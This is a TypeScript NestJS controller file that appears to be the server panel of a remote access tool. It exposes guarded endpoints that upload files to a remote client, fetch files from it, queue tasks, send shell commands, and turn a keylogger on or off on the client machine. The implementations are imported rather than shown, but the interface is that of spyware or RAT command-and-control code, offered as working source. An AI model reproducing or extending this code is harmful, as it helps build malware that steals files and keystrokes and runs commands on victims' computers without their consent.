import {
  Body,
  Controller,
  Get,
  Param,
  Post,
  Query,
  UseGuards,
} from "@nestjs/common";
import { CONTROLLER_ROUTE } from "../route.constants";
import { FileToClientUseCase } from "../../application/events/file-to-client.use-case";
import { GetTasksUseCase } from "../../application/events/get-tasks.use-case";
import { SendCmdCommandToClientUseCase } from "../../application/events/send-cmd-command.use-case";
import { ClientPermissionRepository } from "@/src/repository/db/clientPermisions/clientPermission.repository";
import { ClientPermissionGuard } from "@/src/repository/db/clientPermisions/clientPermission.guard";
import { SendKeyloggerToClientUseCase } from "../../application/events/send-keylogger.use-case";
import {
  GetFileDto,
  SendCmdCommandToClientDto,
  SendFileToClientDto,
  SendKeyloggerToClientDto,
} from "./dto/controller.dto";

@Controller(CONTROLLER_ROUTE)
export class ControllerEvents {
  constructor(
    private readonly fileToClientUseCase: FileToClientUseCase,
    private readonly getTasksUseCase: GetTasksUseCase,
    private readonly sendCmdToClientUseCase: SendCmdCommandToClientUseCase,
    private readonly sendKeyloggerToClientUseCase: SendKeyloggerToClientUseCase,
  ) {}

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/upload-file")
  async getCurrentClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendFileToClientDto,
  ) {
    return await this.fileToClientUseCase.sendFileToClient(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/file")
  async getFileFromClient(
    @Param("controllerid") controllerid: string,
    @Body() body: GetFileDto,
  ) {
    return await this.fileToClientUseCase.getFileFromClient(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Get(":controllerid/tasks")
  async sendTasksToEvent(@Param("controllerid") controllerid: string) {
    return await this.getTasksUseCase.execute(controllerid);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/cmd")
  async sendCmdCommandToClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendCmdCommandToClientDto,
  ) {
    return await this.sendCmdToClientUseCase.execute(controllerid, body);
  }

  @UseGuards(ClientPermissionGuard)
  @Post(":controllerid/keylogger")
  async sendKeyloggerToClient(
    @Param("controllerid") controllerid: string,
    @Body() body: SendKeyloggerToClientDto,
  ) {
    return await this.sendKeyloggerToClientUseCase.execute(
      controllerid,
      body.status,
    );
  }
}
